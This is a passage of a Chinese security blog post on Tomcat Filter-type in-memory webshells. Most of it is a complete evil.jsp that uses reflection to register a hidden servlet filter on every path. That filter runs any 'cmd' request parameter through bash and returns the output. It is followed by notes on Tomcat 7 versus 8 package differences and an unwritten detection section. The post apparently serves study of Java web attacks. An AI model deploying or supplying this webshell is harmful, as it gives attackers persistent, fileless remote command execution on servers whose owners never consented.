class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;<br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">final</span> String name = <span class="hljs-string">&quot;reader-l&quot;</span>;<br>    ServletContext servletContext = request.getSession().getServletContext();<br><br>    Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-keyword">true</span>);<br>    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br><br>    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-keyword">true</span>);<br>    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br><br>    Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-keyword">true</span>);<br>    Map filterConfigs = (Map) Configs.get(standardContext);<br><br>    <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-keyword">null</span>)&#123;<br>        Filter filter = <span class="hljs-keyword">new</span> Filter() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>                HttpServletRequest req = (HttpServletRequest) servletRequest;<br>                <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-keyword">null</span>)&#123;<br>                    <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>                    Process process = <span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                    <span class="hljs-keyword">int</span> len = process.getInputStream().read(bytes);<br>                    servletResponse.getWriter().write(<span class="hljs-keyword">new</span> String(bytes,<span class="hljs-number">0</span>,len));<br>                    process.destroy();<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                filterChain.doFilter(servletRequest,servletResponse);<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>            &#125;<br><br>        &#125;;<br><br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 创建一个FilterDef 然后设置我们filterDef的名字，和类名，以及类</span><br><span class="hljs-comment">         */</span><br>        FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();<br>        filterDef.setFilter(filter);<br>        filterDef.setFilterName(name);<br>        filterDef.setFilterClass(filter.getClass().getName());<br><br>        <span class="hljs-comment">// 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中</span><br>        standardContext.addFilterDef(filterDef);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 创建一个filtermap</span><br><span class="hljs-comment">         * 设置filter的名字和对应的urlpattern</span><br><span class="hljs-comment">         */</span><br>        FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();<br>        filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>        filterMap.setFilterName(name);<br>            <span class="hljs-comment">// 这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span><br>        filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 将filtermap 添加到 filterMaps 中的第一个位置</span><br><span class="hljs-comment">         */</span><br>        standardContext.addFilterMapBefore(filterMap);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 利用反射创建 FilterConfig，并且将 filterDef 和 standardCtx（即 Context）作为参数进行传入</span><br><span class="hljs-comment">         */</span><br>        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 将 name 和 filterConfig 作为 key-value进行传入</span><br><span class="hljs-comment">         */</span><br>        filterConfigs.put(name,filterConfig);<br>        out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
<p>访问evil.jsp，显示注入成功：</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/12.png" srcset="/img/loading.gif"></p>
<p>而后访问任何路径，并且传入参数<code>cmd</code>就可以：</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/13.png" srcset="/img/loading.gif"></p>
<h3 id="4-Tomcat版本不同导致的坑点"><a href="#4-Tomcat版本不同导致的坑点" class="headerlink" title="4.Tomcat版本不同导致的坑点"></a>4.Tomcat版本不同导致的坑点</h3><p>这问题我搞了好久。。。。。</p>
<p>感谢这篇文章给的提示：<a target="_blank" rel="noopener" href="https://www.kitsch.live/2021/04/17/webshell%E2%91%A1%E7%94%A8servlet%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%E5%86%85%E5%AD%98%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6webshell/">https://www.kitsch.live/2021/04/17/webshell%E2%91%A1%E7%94%A8servlet%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%E5%86%85%E5%AD%98%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6webshell/</a></p>
<p>坑：<br>tomcat 7 与 tomcat 8 在 FilterDef 和 FilterMap 这两个类所属的包名不一样<br>tomcat 7:</p>
<p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/14.png" srcset="/img/loading.gif"></p>
<p>tomcat8：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.descriptor</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.FilterDef</span>;<br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.descriptor</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.FilterMap</span>;<br></code></pre></td></tr></table></figure>
<h1 id="4-内存马的排查"><a href="#4-内存马的排查" class="headerlink" title="4.内存马的排查"></a>4.内存马的排查</h1><p>这一点后面在写。。</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
                    
                  </div>
                
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Java安全-CommonsCollections3链分析学习</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
                        <span class="hidden-mobile">Java安全-CommonsCollections6利用链分析</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div id="vcomments"></div>
  <script type="text/javascript">
    Fluid.utils.waitElementVisible('vcomments', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
        new Valine({
          el: "#vcomments",
          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
          placeholder: "Just go go",
          path: window.location.pathname,
          avatar: "mm",
          meta: ["nick","mail","link"],
          pageSize: "10",
          lang: "zh-CN",
          highlight: false,
          recordIP: false,
          serverURLs: "",
        });
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the
    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
  </noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>












  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



</body>
</html>
